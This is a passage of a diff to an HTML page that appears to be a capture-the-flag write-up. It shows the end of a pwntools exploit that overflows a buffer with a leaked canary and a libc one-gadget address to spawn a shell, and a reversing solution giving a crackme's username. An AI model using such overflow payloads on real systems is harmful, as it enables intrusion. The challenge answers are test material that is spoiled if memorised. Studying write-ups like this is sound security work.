+r.sendlineafter(<span class="hljs-string">":"</span>, flat(<span class="hljs-string">"a"</span> * <span class="hljs-number">136</span>, canary, <span class="hljs-string">'b'</span> * <span class="hljs-number">8</span>, libc_base + <span class="hljs-number">0x45216</span>))
+
+r.interactive()</code></pre><h3 id="crack-me-username"><a class="header-link" href="#crack-me-username"></a>crack-me-username</h3>
+<p>After reversing, the input string will be mapped to <code>6U2SRYZ9A84VQXK&gt;7;F5E?I0GJW=PD3&lt;MT@BLH:NO1C</code> one byte by one byte and insert to the balance tree. And then, check the pre-order traversal is equals to <code>E852036?;&lt;B@DLIGJPNU</code>. Therefore, do the reverse way and we get the username <code>D9TCEFL20ASHIW1GNORM</code>.</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
